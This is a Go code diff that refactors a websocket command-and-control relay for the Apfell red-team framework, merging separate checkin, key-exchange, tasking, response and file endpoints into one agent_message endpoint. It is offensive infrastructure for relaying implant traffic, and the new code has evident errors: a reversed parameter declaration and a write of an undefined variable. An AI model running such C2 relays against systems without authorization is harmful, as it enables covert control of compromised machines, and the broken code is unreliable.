@@ -67,14 +67,19 @@ func (s *WebsocketC2) SetSocketURI(uri string) {
 	s.SocketURI = uri
 }
 
+func (s *WebsocketC2) postMessage([]byte msg) []byte {
+	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	return s.htmlPostData(urlEnding, msg)
+}
+
 func (s WebsocketC2) GetNextTask(apfellID string) []byte {
 	//place holder
-	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", s.ApfellBaseURL(), apfellID)
+	url := fmt.Sprintf("%sapi/v%s/agent_message", s.ApfellBaseURL(), ApiVersion)
 	return s.htmlGetData(url)
 }
 
 func (s WebsocketC2) PostResponse(taskid string, output []byte) []byte {
-	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", taskid)
+	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return s.postRESTResponse(urlEnding, output)
 }
 
@@ -207,7 +212,7 @@ func (s *WebsocketC2) manageClient(c *websocket.Conn) {
 
 LOOP:
 	for {
-		// Wait for the client to send the initial checkin/EKE message
+		// Wait for the client to send the initial checkin message
 		m := Message{}
 		err := c.ReadJSON(&m)
 
@@ -216,131 +221,30 @@ LOOP:
 			return
 		}
 
-		switch m.MType {
-		case CheckInMsg:
-			// Forward the checkin data to apfell. This data should not be encrypted
-			s.Websocketlog(fmt.Sprintf("Received Check in message %+v\n", m))
-			resp := s.htmlPostData("api/v1.3/callbacks/", []byte(m.Data))
-
-			// Create the msg to respond to the client
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = CheckInMsg
-
-			// We don't need to set the ID or IDtype.
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-			break
-
-		case EKE:
-			// Peform EKE with apfell
-
-			s.Websocketlog(fmt.Sprintf("Received EKE message %+v\n", m))
-			resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/EKE/%s", m.ID), []byte(m.Data))
-			if len(resp) == 0 {
-				s.Websocketlog("Received empty response from apfell, exiting..")
-				break LOOP
-			}
-
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = EKE
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-			break
-
-		case AES:
-			// Facilitate the AES checkin
-			s.Websocketlog(fmt.Sprintf("Received AES message %+v\n", m))
-
-			resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", m.ID), []byte(m.Data))
-			if len(resp) == 0 {
-				s.Websocketlog("Received empty response from apfell")
-				break LOOP
-			}
-
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = AES
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-			break
-
-		case TaskMsg:
-			// Handle task request from client
-
-			s.Websocketlog(fmt.Sprintf("Received Task message %+v\n", m))
-			resp := s.GetNextTask(m.ID)
-
-			if len(resp) == 0 {
-				s.Websocketlog("Received empty response from Apfell.... retrying ")
-				time.Sleep(time.Duration(s.PollingInterval()) * time.Second)
-
-				resp = s.GetNextTask(m.ID)
-			}
-
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = TaskMsg
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-
-			break
-
-		case ResponseMsg:
-			// Handle task responses
-
-			s.Websocketlog(fmt.Sprintf("Received Response message %+v\n", m))
-			resp := s.htmlPostData(fmt.Sprintf("api/v1.3/responses/%s", m.ID), []byte(m.Data))
-
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = ResponseMsg
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-
-			break
-
-		case FileMsg:
-			// Handle file uploads
-
-			s.Websocketlog(fmt.Sprintf("Received File message %+v\n", m))
-			endpoint := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", m.ID, m.Tag)
-			url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
-			resp := s.htmlGetData(url)
-
-			re := Message{}
-			re.Data = string(resp)
-			re.MType = FileMsg
-
-			if err = c.WriteJSON(re); err != nil {
-				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
-				break LOOP
-			}
-
-
-			break
+		var resp []byte
+		if m.Client {
+			s.Websocketlog(fmt.Sprintf("Received agent message %+v\n", m))
+			resp = s.postMessage([]byte(m.Data))
 		}
+		
+
+		reply := Message{Client: false}
+		reply.Client = false
+
+		if len(resp) == 0 {
+			reply.Data = string(make([]byte, 1))
+		} else {
+			reply.Data = string(resp)
+		}
+
+		reply.Tag = m.Tag
+
+
+		if err = c.WriteJSON(re); err != nil {
+			s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
+			break LOOP
+		}
+		
 	}
 
 	c.Close()
